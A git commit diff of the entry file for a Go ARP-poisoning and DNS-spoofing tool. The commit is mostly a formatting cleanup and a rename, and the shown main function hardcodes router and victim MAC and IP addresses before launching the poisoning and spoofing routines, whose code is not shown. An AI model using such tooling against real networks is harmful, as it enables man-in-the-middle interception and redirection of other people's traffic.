4b3b029ee7add2b73aeee0f064b51f0996c45f4c
Troy McCall <troyxmccall@gmail.com>
2016-04-12 17:16:34 -0400

    cleanup

--- core.go
+++ core.go
@@ -1,35 +1,35 @@
 package main
 
 import (
-	"fmt"
-	"net"
-	"os"
+  "fmt"
+  "net"
+  "os"
 )
 
 func main() {
-	if os.Geteuid() != 0 {
-		fmt.Println("dnsspoof requires root!")
-		return
-	}
+  if os.Geteuid() != 0 {
+    fmt.Println("gogospoofdns requires root!")
+    return
+  }
 
-	var dev = "eno1"
+  var dev string = "eno1"
 
-	fmt.Println("Running arp poison")
-	routerMac, err := net.ParseMAC("00:1A:6D:38:15:FF")
-	routerIP := net.IP{192, 168, 1, 100}
-	localMac, err := net.ParseMAC("98:90:96:D5:84:7B")
-	localIP := net.IP{192, 168, 1, 9}
-	victimMac, err := net.ParseMAC("98:90:96:DC:fB:6A")
-	victimIP := net.IP{192, 168, 1, 10}
-	/********* end parse all IP's and MAC's relevent for poisoning / spoofing *********/
+  fmt.Println("Running arp poison")
+  routerMac, err := net.ParseMAC("00:1A:6D:38:15:FF")
+  routerIP := net.IP{192, 168, 0, 100}
+  localMac, err := net.ParseMAC("98:90:96:D5:84:7B")
+  localIP := net.IP{192, 168, 0, 9}
+  victimMac, err := net.ParseMAC("98:90:96:DC:fB:6A")
+  victimIP := net.IP{192, 168, 0, 10}
+  /********* end parse all IP's and MAC's relevent for poisoning / spoofing *********/
 
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
+  if err != nil {
+    fmt.Println(err)
+    os.Exit(1)
+  }
 
-	go arpPoison(dev, routerMac, routerIP, localMac, localIP, victimMac, victimIP)
+  go arpPoison(dev, routerMac, routerIP, localMac, localIP, victimMac, victimIP)
 
-	fmt.Println("Running spoofer")
-	spoof(dev)
+  fmt.Println("Running spoofer")
+  spoof(dev)
 }
